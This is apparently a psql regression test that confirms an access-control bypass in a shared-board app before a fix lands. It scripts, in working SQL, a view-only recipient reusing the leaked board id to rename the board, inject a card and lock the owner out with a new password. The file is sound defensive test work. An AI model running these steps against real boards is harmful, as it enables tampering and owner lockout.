-- Baseline: run against db/00..20 WITHOUT db/21 applied. Every assertion here demands that the
-- bypass still works, so it fails once the fix lands. That is the point: it pins the hole so the
-- companion file 21_view_token.sql can show the same steps being refused afterwards.

\set ON_ERROR_STOP on

set role anon;

select board_create('Victim board', null, array['Doing'], 60) as board_id \gset
select (board_view_token(:'board_id', ''))->>'view_token' as view_token \gset
select board_read_shared(:'board_id', :'view_token') as shared \gset
select (:'shared'::jsonb->'columns'->0->>'id') as column_id \gset

-- psql does not interpolate :variables inside a dollar-quoted body, so the ids travel by table.
create temp table target as select :'board_id'::uuid as board_id, :'view_token'::uuid as view_token;

\echo ''
\echo '--- share link handed to the viewer (pre-fix) ---'
select '/board?id=' || :'board_id' || '&view=' || :'view_token' as share_url;

\echo '--- board_read_shared hands the viewer the board id and every column board_id ---'
select
  :'shared'::jsonb->'board'->>'id' as leaked_board_id,
  :'shared'::jsonb->'columns'->0->>'board_id' as leaked_column_board_id;

\echo '--- EXPLOIT: viewer strips &view= from the URL and writes with the board id alone ---'
select board_rename(:'board_id', '', 'Owned by the viewer') as rename_result;

select board_save_cards(
  :'board_id',
  '',
  jsonb_build_array(jsonb_build_object(
    'id', gen_random_uuid(),
    'column_id', :'column_id'::uuid,
    'title', 'injected by a view-only recipient',
    'description', null,
    'color', null,
    'due_date', null,
    'position', 0
  ))
) as save_cards_result;

\echo '--- EXPLOIT: viewer locks the owner out of their own board, permanently ---'
select board_set_password(:'board_id', '', 'attacker-only') as set_password_result;
select board_read(:'board_id', '', false)->>'status' as owner_read_after_lockout;

\echo '--- assertions: the bypass is present ---'
do $$
declare
  victim uuid;
  owned jsonb;
begin
  select board_id into victim from target;
  owned := board_read(victim, 'attacker-only', true);

  if owned->'board'->>'name' <> 'Owned by the viewer' then
    raise exception 'expected the viewer rename to have landed';
  end if;
  if not exists (
    select 1 from jsonb_array_elements(owned->'cards') card
    where card->>'title' = 'injected by a view-only recipient'
  ) then
    raise exception 'expected the viewer card write to have landed';
  end if;
  if board_read(victim, '', false)->>'status' <> 'wrong_password' then
    raise exception 'expected the owner to be locked out';
  end if;
  raise notice 'BYPASS CONFIRMED: a view-only recipient renamed the board, wrote a card, and locked the owner out';
end $$;

reset role;
